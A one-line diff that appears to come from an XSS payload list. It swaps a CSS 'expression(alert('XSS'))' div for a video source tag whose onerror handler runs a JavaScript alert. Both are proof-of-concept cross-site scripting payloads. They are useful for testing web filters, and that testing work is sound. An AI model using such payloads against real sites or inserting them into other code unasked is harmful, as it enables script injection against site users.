@@ -1,1 +1,1 @@
-<DIV STYLE="width: expression(alert('XSS'));">
+<Video> <source onerror = "javascript: alert (XSS)">
